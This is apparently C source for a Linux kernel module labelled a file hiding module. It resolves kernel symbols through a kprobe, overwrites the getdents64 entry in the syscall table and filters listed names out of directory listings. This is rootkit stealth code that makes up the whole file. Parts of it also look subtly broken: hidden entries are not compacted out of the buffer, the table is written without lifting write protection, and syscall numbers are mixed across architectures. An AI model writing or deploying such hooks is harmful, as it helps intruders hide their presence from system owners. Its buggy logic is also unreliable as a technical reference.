/*
 * hook_manager.c - Hook core manager
 * File hiding module - 使用 kprobe 获取 kallsyms_lookup_name
 */

#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/ptrace.h>

#include "hook.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("HOOK");
MODULE_DESCRIPTION("File Hiding Module");
MODULE_VERSION("1.0");

/* Hidden file/folder storage */
static struct hidden_entry hidden_files[MAX_HIDDEN_FILES];
static int hidden_count;
static DEFINE_SPINLOCK(hidden_lock);

/* Symbol resolver via kprobe */
static void *(*kallsyms_lookup_name_fn)(const char *name);
static unsigned long (*arm64_read_sysreg)(int reg);

static int kallsyms_kp_pre(struct kprobe *p, struct pt_regs *regs)
{
	return 0;
}

static void kallsyms_kp_post(struct kprobe *p, struct pt_regs *regs,
			     unsigned long flags)
{
}

static struct kprobe kp_kallsyms_lookup_name = {
	.symbol_name = "kallsyms_lookup_name",
	.pre_handler = kallsyms_kp_pre,
	.post_handler = kallsyms_kp_post,
};

/* 获取符号地址 */
static int init_symbol_resolver(void)
{
	int ret;

	/* 注册 kprobe 获取 kallsyms_lookup_name 地址 */
	ret = register_kprobe(&kp_kallsyms_lookup_name);
	if (ret < 0) {
		pr_err("hook: failed to register kallsyms_lookup_name kprobe: %d\n", ret);
		return ret;
	}

	/* kprobe 会自动填充 kp->addr，之后我们可以用它来调用 */
	kallsyms_lookup_name_fn = (void *)kp_kallsyms_lookup_name.addr;
	pr_info("hook: kallsyms_lookup_name = %px\n", kallsyms_lookup_name_fn);

	/* 也获取 sysreg accessor */
	arm64_read_sysreg = (void *)kallsyms_lookup_name_fn("read_sysreg");

	unregister_kprobe(&kp_kallsyms_lookup_name);
	return 0;
}

/* Syscall table */
static void **syscall_table;
static bool syscall_hooked;

/* Getdents64 syscall number */
#ifndef __NR_getdents64
#define __NR_getdents64 61
#endif

typedef asmlinkage long (*syscall_fn_t)(const struct pt_regs *);
static syscall_fn_t orig_getdents64;

/* Get pointer from register */
static inline void __user *get_dirent_ptr(const struct pt_regs *regs)
{
#ifdef __aarch64__
	return (void __user *)regs->regs[1];
#else
	return (void __user *)regs->di;
#endif
}

int add_hidden_file(const char *name, bool is_dir)
{
	unsigned long flags;
	int i;

	if (!name || strlen(name) >= sizeof(hidden_files[0].name))
		return -EINVAL;

	spin_lock_irqsave(&hidden_lock, flags);

	for (i = 0; i < hidden_count; i++) {
		if (hidden_files[i].active &&
		    strcmp(hidden_files[i].name, name) == 0 &&
		    hidden_files[i].is_dir == is_dir) {
			spin_unlock_irqrestore(&hidden_lock, flags);
			return -EEXIST;
		}
	}

	if (hidden_count >= MAX_HIDDEN_FILES) {
		spin_unlock_irqrestore(&hidden_lock, flags);
		return -ENOSPC;
	}

	strcpy(hidden_files[hidden_count].name, name);
	hidden_files[hidden_count].is_dir = is_dir;
	hidden_files[hidden_count].active = true;
	hidden_count++;

	spin_unlock_irqrestore(&hidden_lock, flags);
	pr_info("hook: added hidden %s: %s\n", is_dir ? "dir" : "file", name);
	return 0;
}

int remove_hidden_file(const char *name)
{
	unsigned long flags;
	int i;

	spin_lock_irqsave(&hidden_lock, flags);

	for (i = 0; i < hidden_count; i++) {
		if (hidden_files[i].active &&
		    strcmp(hidden_files[i].name, name) == 0) {
			hidden_files[i].active = false;
			spin_unlock_irqrestore(&hidden_lock, flags);
			pr_info("hook: removed hidden: %s\n", name);
			return 0;
		}
	}

	spin_unlock_irqrestore(&hidden_lock, flags);
	return -ENOENT;
}

bool is_hidden(const char *name, bool is_dir)
{
	unsigned long flags;
	bool found = false;
	int i;

	if (!name)
		return false;

	spin_lock_irqsave(&hidden_lock, flags);

	for (i = 0; i < hidden_count; i++) {
		if (hidden_files[i].active &&
		    hidden_files[i].is_dir == is_dir &&
		    strcmp(hidden_files[i].name, name) == 0) {
			found = true;
			break;
		}
	}

	spin_unlock_irqrestore(&hidden_lock, flags);
	return found;
}

void clear_hidden_list(void)
{
	unsigned long flags;
	int i;

	spin_lock_irqsave(&hidden_lock, flags);

	for (i = 0; i < hidden_count; i++)
		hidden_files[i].active = false;
	hidden_count = 0;

	spin_unlock_irqrestore(&hidden_lock, flags);
	pr_info("hook: hidden list cleared\n");
}

/* Directory entry structure */
struct linux_dirent64 {
	u64 d_ino;
	s64 d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[256];
};

/* Hooked getdents64 syscall */
static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
	long ret;
	struct linux_dirent64 __user *dirent;
	struct linux_dirent64 *kbuf = NULL;
	struct linux_dirent64 *curr, *prev;
	int count;
	int new_count;
	char name[256];

	/* 调用原始函数 */
	ret = orig_getdents64(regs);
	if (ret <= 0)
		return ret;

	dirent = get_dirent_ptr(regs);
	count = (int)ret;

	kbuf = kmalloc(count + 256, GFP_ATOMIC);
	if (!kbuf)
		return ret;

	if (copy_from_user(kbuf, dirent, count)) {
		kfree(kbuf);
		return ret;
	}

	curr = kbuf;
	prev = NULL;
	new_count = count;

	while (curr < kbuf + count) {
		unsigned short reclen = curr->d_reclen;

		if (reclen == 0)
			break;

		memset(name, 0, sizeof(name));
		strncpy(name, curr->d_name, sizeof(name) - 1);

		if (is_hidden(name, curr->d_type == DT_DIR)) {
			new_count -= reclen;
			if (prev)
				prev->d_off = curr->d_off;
		} else {
			prev = curr;
		}

		curr = (struct linux_dirent64 *)((char *)curr + reclen);
	}

	if (new_count < count && new_count > 0) {
		if (!copy_to_user(dirent, kbuf, new_count))
			ret = new_count;
	}

	kfree(kbuf);
	return ret;
}

/* Patch syscall table */
static void patch_syscall_table(int nr, void *fn)
{
	if (!syscall_table)
		return;

	orig_getdents64 = syscall_table[nr];
	syscall_table[nr] = fn;

#ifdef __aarch64__
	asm volatile("dsb ish; isb" ::: "memory");
#endif

	pr_info("hook: patched syscall %d\n", nr);
}

static void restore_syscall_table(int nr)
{
	if (!syscall_table)
		return;

	syscall_table[nr] = orig_getdents64;

#ifdef __aarch64__
	asm volatile("dsb ish; isb" ::: "memory");
#endif

	pr_info("hook: restored syscall %d\n", nr);
}

/* External vfs hook functions */
extern int vfs_hook_init(void);
extern void vfs_hook_exit(void);

static int __init hook_init(void)
{
	int ret;

	pr_info("hook: initializing...\n");

	/* 初始化符号解析器 - 通过 kprobe */
	ret = init_symbol_resolver();
	if (ret < 0) {
		pr_err("hook: failed to init symbol resolver: %d\n", ret);
		return ret;
	}

	/* 获取 syscall table */
	syscall_table = (void **)kallsyms_lookup_name_fn("sys_call_table");
	if (!syscall_table) {
		pr_err("hook: failed to find sys_call_table\n");
		return -ENOENT;
	}
	pr_info("hook: sys_call_table = %px\n", syscall_table);

	/* Patch getdents64 */
	patch_syscall_table(__NR_getdents64, hook_getdents64);
	syscall_hooked = true;

	ret = vfs_hook_init();
	if (ret < 0)
		pr_warn("hook: vfs_hook_init failed: %d\n", ret);

	pr_info("hook: module initialized\n");
	return 0;
}

static void __exit hook_exit(void)
{
	if (syscall_hooked)
		restore_syscall_table(__NR_getdents64);

	vfs_hook_exit();
	clear_hidden_list();
	pr_info("hook: module exited\n");
}

module_init(hook_init);
module_exit(hook_exit);
